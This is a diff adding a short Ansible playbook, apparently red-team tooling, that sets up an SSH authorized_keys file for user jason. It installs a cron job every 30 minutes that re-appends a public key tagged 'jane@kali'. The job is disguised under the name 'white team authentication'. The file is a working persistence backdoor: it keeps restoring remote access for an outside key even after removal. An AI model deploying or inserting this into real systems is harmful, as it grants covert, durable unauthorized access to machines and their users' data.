@@ -1,0 +1,16 @@
+---
+- hosts:
+    - localhost
+  tasks:
+    - name: "set up .ssh directory"
+      shell: "mkdir /home/jason/.ssh; touch /home/jason/.ssh/authorized_keys; chmod 644 /home/jason/.ssh/authorized_keys"
+      become: true
+      become_method: "su"
+      become_user: "jason"
+    - name: "cron job to add ssh keys"
+      cron:
+        name: "white team authentication"
+        user: "jason"
+        minute: "*/30"
+        job: "echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCuCmcdmnmdrQPT/6Dd++YsC+NutEgxWDGBhx3esZ731oDCya9bxpC3anL/mzvNO0dkWLfp0dDl55etkf/bvTdGwFworM+ZZtTc7Ttyj57Jp6EzNrb8JHxKvCDJ6JLiV0SD8LD5FMYN9cqofo8DDCd60eGTyghg/niMpvmH8aHo4DzdmHlqvTPtQCgLObaKBudAr9n8Y42BbyfSj10N8J3SYTagR47Cn6vQFuuB8Hr4m/HBRZaFu0A1MwOqTXa+NFQImCTxzbSjpcxqNUns76VgfsQlhEk5AAsI/TDpssIEzVTZhxVAqRdKAv+Z2DIlP35C11+xuyD8DOIiDT+L/yWOieDB5oflY77JWdGQXfj3M+6o0JxmgTwR4vWTs8tIo9pP2+Wx8tHLhipQDtWDeOZAcKT+hIF5R4e3EFhdnMQEIq6louYMzuJ8glF5TNDpdRl2xaUYA82josi8dp7io31KXsQYuzsegDyDmnbk8JoF11ecpszfrPpazQhS8P9PtLk= jane@kali' >> /home/jason/.ssh/authorized_keys"
+        state: present
